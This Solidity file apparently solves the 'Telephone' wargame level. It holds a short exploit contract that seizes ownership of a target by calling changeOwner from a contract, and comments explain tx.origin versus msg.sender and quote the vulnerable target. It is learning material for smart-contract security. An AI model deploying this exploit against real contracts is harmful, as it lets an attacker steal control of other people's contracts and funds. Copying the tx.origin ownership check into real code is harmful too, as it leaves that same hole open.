// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// interface into Telephone, grab changeOwner function.
interface ITelephone {
    function changeOwner(address _owner) external;
}


// Exploit Contract
contract TelephoneHack {
  constructor(address _targetAddress) {
    // Immediately calls the changeOwner function upon deployment, so no script is needed.
    ITelephone(_targetAddress).changeOwner(msg.sender);
  }
}

/*

Alex makes a contract A that calls into contract B. Alex -> A -> B

=> In contract A, tx.origin = Alex. msg.sender = Alex.
=> In contract B, tx.origin = Alex. msg.sender = Contract A.

=> tx.origin is the original sender who started the chain of events. 
=> msg.sender is the immediate last caller.


To change owners in the Telephone contract, we need to make sure tx.origin =! msg.sender.
msg.sender is the address of contract HackTelephone.
tx.origin is address of the original sender Alex.

*/

/*
// Target contract
contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
*/